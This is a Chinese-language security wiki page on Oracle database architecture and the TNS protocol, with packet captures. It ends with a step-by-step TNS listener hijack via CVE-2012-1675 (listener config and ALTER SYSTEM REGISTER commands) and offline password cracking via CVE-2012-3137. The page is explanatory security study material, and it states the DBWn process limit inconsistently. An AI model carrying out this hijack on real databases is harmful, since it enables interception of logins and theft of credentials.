class="toc-number">4.1.</span> <span class="toc-text">sidguesser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oscanner"><span class="toc-number">4.2.</span> <span class="toc-text">oscanner</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tnscmd10g"><span class="toc-number">4.3.</span> <span class="toc-text">tnscmd10g</span></a></li></ol></li></ol>
+                </div>
+            
+        
+        
+            <p>[TOC]</p>
+<h2 id="Oracle-数据库体系结构"><a href="#Oracle-数据库体系结构" class="headerlink" title="Oracle 数据库体系结构"></a>Oracle 数据库体系结构</h2><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/1.gif" style="zoom: 150%;">   
+
+<p>分为两个大部分：</p>
+<h3 id="RDBMS-关系数据库管理系统"><a href="#RDBMS-关系数据库管理系统" class="headerlink" title="RDBMS 关系数据库管理系统"></a>RDBMS 关系数据库管理系统</h3><p>控制文件（.ctl）</p>
+<p>数据文件（.dbf）</p>
+<p>日志文件（.log）</p>
+<p>SGA：系统全局区，主要包括：</p>
+<p>共享池：用于存储最近定义的sql语句和数据定义。</p>
+<p>Oracle使用最近最少使用(LRU，leastrecentlyused)算法来管理可用空间。</p>
+<p>1）数据块缓存区<br>数据块缓存区(datablockbuffercache)是SGA中的一个高速缓存区域，用来存储从数据库中读取数据段的数据块(如表、索引和簇)。数据块缓存区的大小由数据库服务器init.ora文件中的DB_LOCK_BUFFERS参数决定(用数据库块的个数表示)。在调整和管理数据库时，调整数据块缓存区的大小是一个重要的部分。</p>
+<p>2）字典缓存区<br>数据库对象的信息存储在数据字典表中，这些信息包括用户帐号数据、数据文件名、段名、盘区位置、表说明和权限，当数据库需要这些信息(如检查用户查询一个表的授权)时，将读取数据字典表并且将返回的数据存储在字典缓存区的SGA中。</p>
+<p>3）重做日志缓冲区<br>重做项描述对数据库进行的修改。它们写到联机重做日志文件中，以便在数据库恢复过程中用于向前滚动操作。然而，在被写入联机重做日志文件之前，事务首先被记录在称作重做日志缓冲区(redologbuffer)的SGA中。数据库可以周期地分批向联机重做日志文件中写重做项的内容，从而优化这个操作。重做日志缓冲区的大小(以字节为单位)由init.ora文件中的LOG_BUFFER参数决定。</p>
+<p>4）SQL共享池<br>SQL共享池存储数据字典缓存区及库缓存区(librarycache)，即对数据库进行操作的语句信息。当数据块缓冲区和字典缓存区能够共享数据库用户间的结构及数据信息时，库缓存区允许共享常用的SQL语句。</p>
+<p>SQL共享池包括执行计划及运行数据库的SQL语句的语法分析树。在第二次运行(由任何用户)相同的SQL语句时，可以利用SQL共享池中可用的语法分析信息来加快执行速度。</p>
+<p>SQL共享池通过LRU算法来管理。当SQL共享池填满时，将从库缓存区中删掉最近最少使用的执行路径和语法分析树，以便为新的条目腾出空间。如果SQL共享池太小，语句将被连续不断地再装入到库缓存区，从而影响操作性能。</p>
+<p>SQL共享池的大小(以字节为单位)由init.ora文件参数SHARED_POOL_SIZE决定。</p>
+<p>5）大池<br>大池(LargePool)是一个可选内存区。如果使用线程服务器选项或频繁执行备份/恢复操作，只要创建一个大池，就可以更有效地管理这些操作。大池将致力于支持SQL大型命令。利用大池，就可以防止这些SQL大型命令把条目重写入SQL共享池中，从而减少再装入到库缓存区中的语句数量。大池的大小(以字节为单位)通过init.ora文件的LARGE_POOL_SIZE参数设置，用户可以使用init.ora文件的LARGE_POOL_MIN_ALLOC参数设置大池中的最小位置。Oracle8i已不用这个参数。作为使用LargePool的一种选择方案，可以用init.ora文件的SHARED_POOL_RESERVED_SIZE参数为SQL大型语句保留一部分SQL共享池。</p>
+<p>6）Java池<br>由其名字可知，Java池为Java命令提供语法分析。Java池的大小(以字节为单位)通过在Oracle引入的init.ora文件的JAVA_POOL_SIZE参数设置。init.ora文件的JAVA_POOL_SIZE参数缺省设置为10MB。</p>
+<p>7）多缓冲池<br>可以在SGA中创建多个缓冲池，能够用多个缓冲池把大数据集与其他的应用程序分开，以减少它们争夺数据块缓存区内相同资源的可能性。对于创建的每一个缓冲池，都要规定其LRU锁存器的大小和数量。缓冲区的数量必须至少比LRU锁存器的数量多50倍。</p>
+<p>创建缓冲池时，需要规定保存区(keeparea)的大小和再循环区(recyclearea)的大小。与SQL共享池的保留区一样，保存区保持条目，而再循环区则被频繁地再循环使用。可以通过BUFFER_POOL_KEEP参数规定来保存区的大小。例如：<br>保存和再循环缓冲池的容量减少了数据块缓冲存储区中的可用空间(通过DB_BLOCK_BUFFERS参数设置)。对于使用一个新缓冲池的表，通过表的storage子句中的buffer_pool参数来规定缓冲池的名字。例如，如果需要从内存中快速删除一个表，就把它赋予RECYCLE池。缺省池叫作DEFAULT，这样就能在以后用altertable命令把一个表转移到DEFAULT池。</p>
+<p>PGA：为用户进程保留的空间，即服务器进程。</p>
+<p>后台进程：</p>
+<p>• 数据库写进程(DBW<em>n</em>)</p>
+<p>​        负责将数据库缓冲区高速缓存中经过修改的缓冲区（脏数据缓冲区）写入磁盘。在一个数据库实例中，DBWn进程最多可以启动36个，进程名分别为DBWn0、DBWn1、DBWn2、…DBWnj。</p>
+<p>​        注：LRU（Least Recently Used，最近最少使用）：数据缓冲的一种管理机制，只保留最近数据，不保留旧数据。</p>
+<p>​        注：DIRTY：表示“脏列”或者“弄脏了的数据”，实际上就是指被修改但是还没有写入数据文件的数据。</p>
+<p>​        通过命令可以来了解参数信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show parameter db_writer_processes;</span><br></pre></td></tr></table></figure>
+
+<p>​        DBWn进程最多可以启动20个，所以DB_WRITER_PROCESSES参数的取值范围是1-36。</p>
+<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/3.png"> </p>
+<p>• 日志写进程(LGWR)</p>
+<p>​        负责管理日志缓冲区的一个后台进程，用于将日志缓冲区中的日志数据写入磁盘的日志文件中</p>
+<p>​        在数据库运行时，对数据库的修改操作将被记录到日志信息中，这些日志信息首先保存在日志缓冲区，当日志信息达到一定量时，由LGWR进程将日志数据写入日志文件。</p>
+<p>​        需要LGWR进程将缓冲区数据中的日志数据写入磁盘的主要情况有如下几种：</p>
+<ul>
+<li>用户进程提交（commit）事务</li>
+<li>日志缓冲区池已满1/3</li>
+<li>出现超时（每隔3秒）</li>
+<li>DBWn进程调用磁盘写入进程</li>
+</ul>
+<p>• 检查点进程(CKPT)</p>
+<p>　一般在发生日志切换时产生。在系统运行过程中，当需要将修改后的数据写回数据文件并且产生日志切换时就会产生检查点。检查点保证所有修改过的数据库缓冲区中的数据都被写入磁盘数据文件中。<br>　　在Oracle数据库中，提供了两个参数控制检查点的产生：一个是LOG_CHECKPOINT_TIMEOUT,用来设置检查点产生的时间间隔；另一个是LOG_CHECKPOINT_INTERVAL,用来设置一个检查点需要填充的日志文件块的数目也就是每产生多少个日志数据，自动产生一个检查点。</p>
+<p>​        通过以下命令了解log_checkpoint_timeout参数信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show parameter log_checkpoint_timeout; </span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/4.png"></p>
+<p>​        log_checkpoint_timeout参数默认值为1800，单位为秒。</p>
+<p>​        通过以下命令可以了解log_checkpoint_interval 参数值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show parameter log_checkpoint_interval;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/5.png"></p>
+<p>​        log_checkpoint_interval参数值默认为0。</p>
+<p>• 系统监视器进程(SMON)</p>
+<p>​        在实例启动时执行实例恢复，并负责清理不再使用的临时段。在具有并行服务器选项的环境下，SMON进程对有故障的CPU或者实例进行实例恢复。SMON进程被有规律的唤醒，检查是否需要使用，其他进程需要时也可以调用次进程。（可被hacker调用）</p>
+<p>​        实例恢复：</p>
+<p>• 进程监视器进程(PMON)</p>
+<p>​        用于在用户进程出现故障时执行进程恢复操作，并负责清理内存存储区和释放该进程所用的资源。改进程周期性的检查调度进程和服务器进程的状态，如果发现进程已死，则重新启动它。PMON进程被有规律的唤醒，检查是否需要使用，其他进程需要使用时也可以调用此进程。（可被hacker调用）</p>
+<p>• 归档进程(ARC<em>n</em>)</p>
+<p>• 恢复器进程(RECO)</p>
+<p>• 封锁进程(LCK<em>n</em>)</p>
+<p>• 调度进程(Dnn<em>n</em>)</p>
+<p>• 快照进程(SNP<em>n</em>)</p>
+<p>• 作业队列协调程序(CJQ0)</p>
+<p>• 作业从属进程(J<em>nnn</em>)</p>
+<p>• 队列监视器进程(QMN<em>n</em>)</p>
+<h3 id="TNS监听服务"><a href="#TNS监听服务" class="headerlink" title="TNS监听服务"></a>TNS监听服务</h3><p>​        TNS监听是攻击的重点</p>
+<h4 id="TNS协议结构"><a href="#TNS协议结构" class="headerlink" title="TNS协议结构"></a>TNS协议结构</h4><p>TNS 包由一个header和payload 组成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0      8       16            31</span><br><span class="line">+--------------+--------------+</span><br><span class="line">| Packet Length| Packet Chksm | </span><br><span class="line">+------+-------+--------------+   8 byte header</span><br><span class="line">| Type | Rsrvd | Header Chksm | </span><br><span class="line">+------+-------+--------------+</span><br><span class="line">|        P A Y L O A D        |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>通用Header8个字节：</p>
+<table>
+<thead>
+<tr>
+<th>Length</th>
+<th>2</th>
+<th>包的长度，包括通用包头</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Packet check sum</td>
+<td>2</td>
+<td>包的校验和</td>
+</tr>
+<tr>
+<td>Type</td>
+<td>1</td>
+<td>TNS类型</td>
+</tr>
+<tr>
+<td>Flag</td>
+<td>1</td>
+<td>状态</td>
+</tr>
+<tr>
+<td>Header check sum</td>
+<td>2</td>
+<td>通用头的校验和</td>
+</tr>
+</tbody></table>
+<p>注：</p>
+<p>​    Length：包长度（包括包头）</p>
+<p>​    Type： 数据包的类型</p>
+<table>
+<thead>
+<tr>
+<th>类型号</th>
+<th></th>
+<th>类型说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>0x01</td>
+<td>连接（CONNECT）</td>
+</tr>
+<tr>
+<td>2</td>
+<td>0x02</td>
+<td>接受（ACCEPT）</td>
+</tr>
+<tr>
+<td>3</td>
+<td>0x03</td>
+<td>确认（ACK）</td>
+</tr>
+<tr>
+<td>4</td>
+<td>0x04</td>
+<td>拒绝（REFUTE）</td>
+</tr>
+<tr>
+<td>5</td>
+<td>0x05</td>
+<td>重定向（REDIRECT）</td>
+</tr>
+<tr>
+<td>6</td>
+<td>0x06</td>
+<td>数据（DATA）</td>
+</tr>
+<tr>
+<td>7</td>
+<td>0x07</td>
+<td>NULL</td>
+</tr>
+<tr>
+<td>8</td>
+<td>0x08</td>
+<td></td>
+</tr>
+<tr>
+<td>9</td>
+<td>0x09</td>
+<td>中止（ABORT）</td>
+</tr>
+<tr>
+<td>10</td>
+<td>0x0a</td>
+<td></td>
+</tr>
+<tr>
+<td>11</td>
+<td>0x0b</td>
+<td>重新发送（RESEND）</td>
+</tr>
+<tr>
+<td>12</td>
+<td>0x0c</td>
+<td>标记（MARKER）</td>
+</tr>
+<tr>
+<td>13</td>
+<td>0x0d</td>
+<td>ATTENTION</td>
+</tr>
+<tr>
+<td>14</td>
+<td>0x0e</td>
+<td>控制（CONTROL）</td>
+</tr>
+</tbody></table>
+<p>payload：</p>
+<p>Connect 连接类型数据如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Transparent Network Substrate Protocol</span><br><span class="line">    Packet Length: 254</span><br><span class="line">    Packet Checksum: 0x0000</span><br><span class="line">    Packet Type: Connect (1)</span><br><span class="line">    Reserved Byte: 00</span><br><span class="line">    Header Checksum: 0x0000</span><br><span class="line">    Connect</span><br><span class="line">        Version: 313</span><br><span class="line">        Version (Compatible): 300</span><br><span class="line">        Service Options: 0x0000</span><br><span class="line">        Session Data Unit Size: 2048</span><br><span class="line">        Maximum Transmission Data Unit Size: 32767</span><br><span class="line">        NT Protocol Characteristics: 0xc60e</span><br><span class="line">        Line Turnaround Value: 0</span><br><span class="line">        Value of 1 in Hardware: 0100</span><br><span class="line">        Length of Connect Data: 196</span><br><span class="line">        Offset to Connect Data: 58</span><br><span class="line">        Maximum Receivable Connect Data: 512</span><br><span class="line">        Connect Flags 0: 0x61</span><br><span class="line">        Connect Flags 1: 0x61</span><br><span class="line">        Trace Cross Facility Item 1: 0x00000000</span><br><span class="line">        Trace Cross Facility Item 2: 0x00000000</span><br><span class="line">        Trace Unique Connection ID: 0x0000000000000000</span><br><span class="line">        Connect Data: (DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME=ORCL)(CID=(PROGRAM=</span><br><span class="line">                       C:\oracle\product\10.2.0\client_1\bin\sqlplus.exe)</span><br><span class="line">                       (HOST=WINXPSP2)(USER=vmware)))(ADDRESS=(PROTOCOL=TCP)</span><br><span class="line">                       (HOST=192.168.1.102)(PORT=1521)))</span><br><span class="line"> 0.018134   192.168.1.108   192.168.1.102   TNS Request, Connect (1), Connect</span><br><span class="line"> 0000   00 0c 29 0c 9a c7 00 0c 29 fd 07 3d 08 00 45 00  ..).....)..=..E.</span><br><span class="line"> 0010   01 26 05 0b 40 00 80 06 70 a4 c0 a8 01 6c c0 a8  .&amp;..@...p....l..</span><br><span class="line"> 0020   01 66 04 66 05 f1 ac 94 a7 3e 66 d2 7e ee 50 18  .f.f.....&gt;f.~.P.</span><br><span class="line"> 0030   ff ff 15 91 00 00 00 fe 00 00 01 00 00 00 01 39  ...............9</span><br><span class="line"> 0040   01 2c 00 00 08 00 7f ff c6 0e 00 00 01 00 00 c4  .,..............</span><br><span class="line"> 0050   00 3a 00 00 02 00 61 61 00 00 00 00 00 00 00 00  .:....aa........</span><br><span class="line"> 0060   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line"> 0070   28 44 45 53 43 52 49 50 54 49 4f 4e 3d 28 43 4f  (DESCRIPTION=(CO</span><br><span class="line"> 0080   4e 4e 45 43 54 5f 44 41 54 41 3d 28 53 45 52 56  NNECT_DATA=(SERV</span><br><span class="line"> 0090   49 43 45 5f 4e 41 4d 45 3d 4f 52 43 4c 29 28 43  ICE_NAME=ORCL)(C</span><br><span class="line"> 00a0   49 44 3d 28 50 52 4f 47 52 41 4d 3d 43 3a 5c 6f  ID=(PROGRAM=C:\o</span><br><span class="line"> 00b0   72 61 63 6c 65 5c 70 72 6f 64 75 63 74 5c 31 30  racle\product\10</span><br><span class="line"> 00c0   2e 32 2e 30 5c 63 6c 69 65 6e 74 5f 31 5c 62 69  .2.0\client_1\bi</span><br><span class="line"> 00d0   6e 5c 73 71 6c 70 6c 75 73 2e 65 78 65 29 28 48  n\sqlplus.exe)(H</span><br><span class="line"> 00e0   4f 53 54 3d 57 49 4e 58 50 53 50 32 29 28 55 53  OST=WINXPSP2)(US</span><br><span class="line"> 00f0   45 52 3d 76 6d 77 61 72 65 29 29 29 28 41 44 44  ER=vmware)))(ADD</span><br><span class="line"> 0100   52 45 53 53 3d 28 50 52 4f 54 4f 43 4f 4c 3d 54  RESS=(PROTOCOL=T</span><br><span class="line"> 0110   43 50 29 28 48 4f 53 54 3d 31 39 32 2e 31 36 38  CP)(HOST=192.168</span><br><span class="line"> 0120   2e 31 2e 31 30 32 29 28 50 4f 52 54 3d 31 35 32  .1.102)(PORT=152</span><br><span class="line"> 0130   31 29 29 29                                      1)))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Accept接收类型数据如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Transparent Network Substrate Protocol</span><br><span class="line">    Packet Length: 32</span><br><span class="line">    Packet Checksum: 0x0000</span><br><span class="line">    Packet Type: Accept (2)</span><br><span class="line">    Reserved Byte: 04</span><br><span class="line">    Header Checksum: 0x0000</span><br><span class="line">    Accept</span><br><span class="line">        Version: 312</span><br><span class="line">        Service Options: 0x0000</span><br><span class="line">        Session Data Unit Size: 2048</span><br><span class="line">        Maximum Transmission Data Unit Size: 32767</span><br><span class="line">        Value of 1 in Hardware: 0100</span><br><span class="line">        Accept Data Length: 0</span><br><span class="line">        Offset to Accept Data: 32</span><br><span class="line">        Connect Flags 0: 0x61</span><br><span class="line">        Connect Flags 1: 0x61</span><br><span class="line"> 00 0c 29 fd 07 3d 00 0c 29 0c 9a c7 08 00 45 00   ..)..=..).....E.</span><br><span class="line"> 00 48 7c cf 40 00 80 06 f9 bd c0 a8 01 66 c0 a8   .H|.@........f..</span><br><span class="line"> 01 6c 11 d9 04 67 b6 88 7a 22 0e a7 cb 81 50 18   .l...g..z&quot;....P.</span><br><span class="line"> ff 01 1d 97 00 00 00 20 00 00 02 04 00 00 01 38   ....... .......8</span><br><span class="line"> 00 00 08 00 7f ff 01 00 00 00 00 20 61 61 00 00   ........... aa..</span><br><span class="line"> 00 00 00 00 00 00                                 ......</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Refuse拒绝类型数据如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0.047753   192.168.1.102   192.168.1.108   TNS Response, Refuse (4), Refuse</span><br><span class="line">  00 0c 29 fd 07 3d 00 0c 29 0c 9a c7 08 00 45 00  ..)..=..).....E.</span><br><span class="line">  00 8f 53 e2 40 00 80 06 22 64 c0 a8 01 66 c0 a8  ..S.@...&quot;d...f..</span><br><span class="line">  01 6c 05 f1 04 0d e8 a0 2d 2b 67 0d 99 85 50 18  .l......-+g...P.</span><br><span class="line">  fe ff 59 03 00 00 00 67 00 00 04 00 00 00 22 00  ..Y....g......&quot;.</span><br><span class="line">  00 5b 28 44 45 53 43 52 49 50 54 49 4f 4e 3d 28  .[(DESCRIPTION=(</span><br><span class="line">  54 4d 50 3d 29 28 56 53 4e 4e 55 4d 3d 31 35 33  TMP=)(VSNNUM=153</span><br><span class="line">  30 39 32 33 35 32 29 28 45 52 52 3d 31 32 35 31  092352)(ERR=1251</span><br><span class="line">  34 29 28 45 52 52 4f 52 5f 53 54 41 43 4b 3d 28  4)(ERROR_STACK=(</span><br><span class="line">  45 52 52 4f 52 3d 28 43 4f 44 45 3d 31 32 35 31  ERROR=(CODE=1251</span><br><span class="line">  34 29 28 45 4d 46 49 3d 34 29 29 29 29           4)(EMFI=4))))</span><br></pre></td></tr></table></figure>
+
+<p>​         DATA 包是类型6，包括2个字节的 flag 标志位，1字节的 packet id，可选的 TTI id，还有数据本身。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0           16   24    31</span><br><span class="line">+-----------+----+-----+</span><br><span class="line">| Data Flag | ID |&lt;TTI&gt;|</span><br><span class="line">+----------------------+</span><br><span class="line">|        D A T A       |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure>
+
+<p>字段说明：</p>
+<p>Data Flag: 数据标识</p>
+<p>ID：   包ID</p>
+<p>TTI:    TTI(Two-Task Interface) ID</p>
+<p>DATA:   有效数据</p>
+<p>Data Flag 通常是 0x0000， 当所有数据发送完毕指示文件结尾，值为 0x0040</p>
+<p>下面是列出了有效的数据包ID:</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x01</td>
+<td>协议协商。下面这些标识是可以接受的协议版本：0x06 0x05 0x04 0x03 0x02 0x01 0x00</td>
+</tr>
+<tr>
+<td>0x02</td>
+<td>交换数据类型</td>
+</tr>
+<tr>
+<td>0x08</td>
+<td>“OK”服务器给客户端的响应</td>
+</tr>
+<tr>
+<td>0x11</td>
+<td>TTI (Two-Task Interface)功能扩展</td>
+</tr>
+<tr>
+<td>0x20</td>
+<td>使用外部的程序和服务注册</td>
+</tr>
+<tr>
+<td>0xdeadbeef</td>
+<td>附加网络选项，客户端可协商附加连接熟悉，例如：认证，加密，数据完整性，监控。注意：wireshark 中叫这个包为 Secure Network Services</td>
+</tr>
+</tbody></table>
+<h2 id="Oracle-Database-TNS-漏洞"><a href="#Oracle-Database-TNS-漏洞" class="headerlink" title="Oracle Database  TNS 漏洞"></a>Oracle Database  TNS 漏洞</h2><h3 id="TNS劫持"><a href="#TNS劫持" class="headerlink" title="TNS劫持"></a>TNS劫持</h3><p>​        知道目标物理地址和端口，本地搭建同名数据库，通过远程注册目标机器的TNS下同名实例</p>
+<p>​        CVE-2012-1675漏洞是Oracle允许攻击者在不提供用户名/密码的情况下，向远程“TNS Listener”组件处理的数据投毒的漏洞。攻击者可利用此漏洞将数据库服务器的合法“TNS Listener”组件中的数据转向到攻击者控制的系统，导致控制远程组件的数据库实例，造成组件和合法数据库之间的中间人攻击、会话劫持或拒绝服务攻击。</p>
+<p>​        CVE-2012-3137漏洞是Oracle Database 10g/11g身份验证协议实现中存在一个设计缺陷，攻击者无需认证即可远程获取数据库用户密码哈希相关数据，从而可以离线暴力破解用户密码，进一步控制数据库系统。</p>
+<p>我们通过如下的步骤和过程可以实现对Oracle的入侵：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）利用CVE-<span class="number">2012</span>-<span class="number">1675</span>进行TNS劫持，在监听下利用远程注册，注册同名数据库实例；</span><br><span class="line">（<span class="number">2</span>）新登陆的用户，在TNS的负载均衡策略下，有可能流量登录到伪造的监听服务上；</span><br><span class="line">（<span class="number">3</span>）该监听服务对用户的登陆过程进行监控，并将相关数据流量转发到真实的数据库上；</span><br><span class="line">（<span class="number">4</span>）利用CVE-<span class="number">2012</span>-<span class="number">3137</span>获得通讯过程中的认证相关信息；</span><br><span class="line">（<span class="number">5</span>）对认证相关信息进行离线的暴力破解，获得登陆的密码；</span><br><span class="line">（<span class="number">6</span>）试用破解的用户名/密码登陆Oracle，完成对Oracle中数据的访问；</span><br></pre></td></tr></table></figure>
+
+<p><strong>下面是一段可用的TNS劫持的过程：</strong></p>
+<p>1.在劫持机上创建一个和目标数据库实例同名的数据库实例。</p>
+<p>2.在劫持机上修改 tnsnames.ora 文件</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">添加</span><br><span class="line">listener_name=</span><br><span class="line">    (DESCRIPTION=</span><br><span class="line">    (ADDRESS=(PROTOCOL=tcp)(HOST=目标机器IP)(PORT=目标机器端口)))</span><br></pre></td></tr></table></figure>
+
+<p>3.在劫持机上用SQLPlus 顺序执行下面步骤。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">客户端向TNS </span><br><span class="line">侦听器发送一个“数据包”（TNS_TYPE_DATA = 6），其中包含以下数据：</span><br><span class="line"></span><br><span class="line">  1.要注册的服务名称。</span><br><span class="line">  2.以指定的服务名称注册的实例。</span><br><span class="line">  3.允许的最大客户端连接数。</span><br><span class="line">  4.当前建立的客户端连接数。</span><br><span class="line">  5.处理程序的名称。</span><br><span class="line">  6.连接数据库的IP地址和端口。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>$ sqlplus / <span class="keyword">as</span> sysdba</span><br><span class="line"><span class="number">2.</span> SQL&gt; ALTER SYSTEM SETREMOTE_LISTENER=<span class="string">&#x27;LISTENER_NAME&#x27;</span>;</span><br><span class="line"><span class="number">3.</span> SQL&gt; ALTER SYSTEM REGISTER;</span><br></pre></td></tr></table></figure>
+
+<p>4.多个客户端，向数据库发起登录。会劫持到一部分客户端的登录信息。</p>
+<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/7.png"></p>
+<p>​        按照猜想同一个监听下有2个同名实例。客户端访问监听，监听按照客户端中的数据库名信息分配数据库，由于监听下有2个同名数据库，客户端链接很可能会被分配到劫持者的数据库实例下，再通过配置劫持者的本地监听把客户端请求指回原数据库。</p>
+<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/9.png"></p>
+<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/8.png"></p>
+<p>​        通过以上方式我们可以截获约一半左右客户端发送到服务器的合法链接。其中获得了服务器IP、端口号、数据库位置、实例名、登录用户名等一系列明文信息和4组密文信息（AUTH_SESSKEY，AUTH_SESSKEY_CLIENT，AUTH_PASSWORD，AUTH_VFR_DATA）。</p>
+<p>​        通过CVE-2012-3137进行密码破解</p>
+<p>CVE-2012-3137受影响的数据库版本有11.2.0.3，11.2.0.2，11.1.0.7,有使用了SHA-1加密算法的10.2.0.5和10.2.0.4，还有使用了SHA-1的10.2.0.3（运行在z/OS下）版本。</p>
+<p>​        确认加密方式之后，数据库用户被O3logon（oracle验证方式） 进行验证，这个协议执行一个序列来向数据库证明客户端拥有密码。为了避免网络第三方截获到密码。首先客户端发送用户名到数据库来表明用户身份。数据库端根据加密协议，其中96位的作为数据库端密钥，20位的作为偏移量，它对每个连接都是不同的。一个典型的数据库端发给客户端的密钥如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AUTH_SESSKEY.....COCDD89FIGODKWASDF……………………</span><br></pre></td></tr></table></figure>
+
+<p>​        客户端根据加密算法向服务器端发送96位的客户端密钥和64位的密码密钥。服务器端计算客户端传入的密码密钥。如果计算后密码密文和数据库中存储的16位密码密文一致则验证通过。</p>
+<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/6.jpg"></p>
